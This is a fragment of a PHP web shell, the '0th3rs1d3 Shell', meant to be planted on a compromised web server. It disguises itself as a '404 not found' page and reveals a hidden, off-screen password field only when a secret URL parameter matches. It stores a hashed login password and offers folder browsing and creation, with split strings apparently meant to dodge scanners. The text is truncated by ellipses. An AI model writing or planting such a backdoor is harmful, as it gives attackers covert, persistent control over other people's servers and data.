<?php 
$auth_pass ="fa12bedd7ef4ece361c20d0fdbc9a97d";

function Login() {
	echo"<title>404 not found</title>";
	if (isset($_GET['s3cr3t']) && $_GET['s3cr3t'] === 'percival1tigatiga7!@') {
	echo"<form method='post'>";
	echo"<input style='text-align:center;margin:0;margin-top:868px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'>";
	echo"</form>";
	} else {
		echo'';
	}
...
<html>
<head>
	<?php echo "<title>0th3rs1d3 Shell</title>"; ?>
...
<center>
<?php
echo '<font face="Bungee" size="5">0th3rs1d3 Shell</font></center>
...
if (isset($_GET['lokasie'])) {
	...
	if (!isset($_POST['cemod'])) {
		...
		} else {echo '<input type="hidden" name="type" value="di'.'r">';;
		}
    ...
    if ($isw("./") || $ird("./")) {
        ...
        if (isset($_POST['buatfolder'])) {
            ...
            if ($buatf == true) {
                ...
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
